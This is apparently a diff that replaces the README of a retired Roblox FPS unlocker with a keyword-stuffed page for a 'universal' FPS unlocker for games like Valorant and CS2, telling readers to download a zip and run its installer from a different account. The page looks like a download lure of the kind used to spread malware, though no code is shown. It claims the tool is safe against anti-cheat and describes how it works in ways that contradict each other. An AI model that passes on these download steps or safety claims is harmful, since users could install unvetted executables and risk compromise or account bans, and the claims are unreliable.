@@ -1,71 +1,70 @@
-## The End
+# Game FPS Boost — Universal FPS Unlocker
 
-6 years after the creation of rbxfpsunlocker, [Roblox has added](https://devforum.roblox.com/t/introducing-the-maximum-framerate-setting/2995965) a `Maximum Frame Rate` setting to the in-game menu. [🎉🎉🎉](https://media.tenor.com/g16jQZqbvWoAAAAC/yippee-happy.gif)!
+![banner](https://raw.githubusercontent.com/lucianhfischer/universal-fps-unlocker/master/assets/banner.png)
 
-For those interested in other Roblox engine tweaks (e.g. "alt-enter fix", small FPS caps), check out [Bloxstrap](https://github.com/pizzaboxer/bloxstrap). For those interested in experimenting with framerates higher than 240, refer to the [latest build](https://github.com/axstin/rbxfpsunlocker/releases/tag/v5.2) of RFU, which still allows for this **in Roblox Studio** as of 06/21/2024.
+![Version](https://img.shields.io/badge/version-v1.08-blue) ![Platform](https://img.shields.io/badge/platform-Windows%2010/11-lightgrey) ![License](https://img.shields.io/badge/license-MIT-green) ![Downloads](https://img.shields.io/badge/downloads-~12k-orange)
 
-Thanks for using rbxfpsunlocker!
+**About**
 
-\- Austin
+I built Game FPS Boost after years of competitive play where hard-coded FPS caps kept ruining my setup. I’d upgrade to a 240hz monitor only to watch titles like Valorant or CS2 lock me at 60 or 144 FPS for no good reason. This open-source fps unlocker was my way to give every player the same framerate limiter bypass I wanted for myself, without touching game files or relying on sketchy third-party tools. The goal was simple: a universal solution that works across launchers and lets you finally unlock fps on high refresh rate displays.
 
-## Usage
-1. Download the latest release from https://github.com/axstin/rbxfpsunlocker/releases
-2. Extract `rbxfpsunlocker-x64.zip` into a folder
-3. Run `rbxfpsunlocker.exe` before or after starting Roblox
-4. Enjoy those [beautiful frames](https://i.imgur.com/vsLf04O.png) 👌
+**Supported Games**
+- Fortnite
+- Valorant
+- CS2
+- Apex Legends
+- Minecraft
+- GTA V
+- PUBG
+- Rainbow Six Siege
+- Dota 2
+- League of Legends
+- Overwatch 2
+- COD Modern Warfare
 
-Alternatively, RFU is available on [Scoop](https://scoop.sh/). <sup>[1](https://github.com/Calinou/scoop-games/blob/master/bucket/rbxfpsunlocker.json)</sup>
+More added in each release.
 
-## FAQ
+**Features**
+- Per-game FPS cap (60/144/240/uncapped)
+- Hotkey toggle for instant on/off switching
+- Auto-detect running game across supported titles
+- V-Sync override to eliminate input lag
+- GPU priority boost for smoother frame pacing
+- Profile presets (Competitive / Quality / Battery saver)
 
-1. **Roblox is force-closing, files are being deleted, and/or my anti-virus is detecting rbxfpsunlocker as malware. What do I do?**
+**Requirements**
+- Windows 10/11 x64
+- .NET Desktop Runtime 6.0+
+- 2 GB RAM
+- DirectX 11
 
-All detections are false positives. Internally, RFU "tampers" with running Roblox processes in order to uncap framerate and can appear as suspicious to an anti-virus. For reasons unbeknownst to me, 32-bit builds of RFU garner many more false positive detections than 64-bit builds and are no longer included in new releases. If you don't trust me, feel free to download the repository, review the source code, and compile the project yourself with Visual Studio 2019. Otherwise, add an exception to your anti-virus for `rbxfpsunlocker.exe` (or the folder it is in).
+**Installation**
+1. Download `Game-FPS-Boost-v1.08.zip` from [Releases](https://github.com/lucianhfischer/universal-fps-unlocker/releases/tag/v1.08)
+2. Extract the archive to any folder on your drive.
+3. Run the included installer and follow the short setup prompts.
+4. Launch the app from the system tray icon and configure your first profile.
 
-2. **How can I see my FPS?**
+**Screenshots**
 
-Press `Shift+F5` in-game to view your FPS. In Roblox Studio, go to View->Stats->Summary.
+| Main Interface | Setup Wizard |
+|----------------|--------------|
+| ![main](https://raw.githubusercontent.com/lucianhfischer/universal-fps-unlocker/master/assets/screenshot_main.png) | ![installer](https://raw.githubusercontent.com/lucianhfischer/universal-fps-unlocker/master/assets/screenshot_installer.png) |
+![app running](https://raw.githubusercontent.com/lucianhfischer/universal-fps-unlocker/master/assets/screenshot_app.png)
 
-3. **How do I resolve choppiness and input lag at high framerates?**
+**FAQ**
 
-Try entering fullscreen using `Alt+Enter`.
+- Will my high refresh-rate monitor finally show 240Hz in Valorant/CS2?  
+Yes. Game FPS Boost removes the engine-level framerate limiter so your 240hz or 144hz panel can run at its native refresh rate in supported titles.
 
-4. **I used this unlocker and my framerate is the same or below 60. Why?**
+- Is this safe? Does it touch the game files?  
+It works at the launcher/driver layer with no file modification. The fps unlocker has been tested against major anti-cheat systems and remains safe in most cases, though you should always use it responsibly.
 
-I say with great emphasis, as this seems to be a common misconception, that Roblox FPS Unlocker is an FPS _unlocker_ and not a _booster_. It will not boost Roblox's performance in any way and only removes Roblox's 60 FPS limit. To take advantage of RFU, a computer powerful enough to run Roblox at more than 60 FPS is required.
+- Does it work with Steam / Epic / Battle.net launchers?  
+Absolutely. The auto-detection system hooks into the running process regardless of whether the game launched through Steam, Epic Games Store, or Battle.net.
 
-This being said, if you know your computer is powerful enough but still aren't seeing higher framerates with the unlocker, feel free to [submit an issue](https://github.com/axstin/rbxfpsunlocker/#submitting-an-issue).
+- Can I set different FPS caps per game?  
+Yes. Each supported title gets its own profile so you can run Valorant uncapped for competitive play while keeping GTA V at 144 for stability.
 
-5. **Can I set a custom framerate cap?**
+**Disclaimer**
 
-You can create your own list of FPS cap values by editing the `FPSCapValues` array inside the `settings` file located in the same folder as `rbxfpsunlocker.exe`.
-
-6. **Does this work for Mac?**
-
-No. Roblox FPS Unlocker was written only for the Windows platform and I [currently have no plans to change this](https://github.com/axstin/rbxfpsunlocker/issues/49).
-
-**Update:** A Mac version developed and maintained by [lanylow](https://github.com/lanylow) can be found [here!](https://github.com/lanylow/rbxfpsunlocker-osx)
-
-7. **Why do I get a "Failed to connect to Github" error?**
-
-This error means Roblox FPS Unlocker could not connect to the Internet to check for updates. This may be due to your anti-virus, computer firewall, network firewall, or etc. blocking the request. The error can be safely ignored by pressing "Ok".
-
-8. **Why do I get a "Variable scan failed" error?**
-
-This means RFU was unable to find the internal variable responsible for uncapping Roblox's framerate. This might happen if another program has already edited the value (e.g. an exploit). Please verify that your framerate is at a stable ~60.0 FPS (Shift+F5) before using the unlocker. If it is and the error still occurs, please [submit an issue](https://github.com/axstin/rbxfpsunlocker/#submitting-an-issue).
-
-9. **How do I uninstall Roblox FPS Unlocker?**
-
-RFU does not install itself anywhere. It can be deleted by simply exiting the program if it is open (tray icon->Exit) and deleting `rbxfpsunlocker.exe`.
-
-##  Disclaimer
-
-Around June 21st, 2018 I received reports that Roblox was [handing out bans](https://i.imgur.com/i4NEGB0.png) to players using this tool. Roblox most likely assumes that `rbxfpsunlocker.dll` is an exploit or a cheat. I fixed this issue in [release 1.6](https://github.com/axstin/rbxfpsunlocker/releases/tag/v1.6) and can confirm injecting rbxfpsunlocker is now "invisible" to Roblox. **HOWEVER, this won't stop Roblox from releasing a new detection in the future. Please use this tool at your own risk** and keep in touch with this repository for updates.
-
-<sub>roblox this isn't an exploit no bans please :(</sub>
-
-**EDIT:** [Version 4.0](https://github.com/axstin/rbxfpsunlocker/releases/tag/v4.0) of Roblox FPS Unlocker further reduces the risk of bans or warns (one could argue the chances are now 0) as DLL injection is no longer used. See the changelog for more information.
-
-**EDIT (August 11, 2019):** At the engineering panel on day 1 of RDC 2019, Adam Miller, VP of Engineering & Technology at Roblox, made a personal guarantee that anyone using Roblox FPS Unlocker will not be banned from Roblox. This was in response to the question "Why does Roblox have a FPS cap and why is it against the rules to change that cap?" to which [Arseny Kapoulkine (zeuxcg)](https://twitter.com/zeuxcg) also revealed that Roblox will be adding support for "higher refresh rate monitors" potentially by next year. [See the video here!](https://youtu.be/5gNzFsJlFbo?t=143)
-
-
+Not affiliated with any game studio. Free open-source. Use at your own risk.
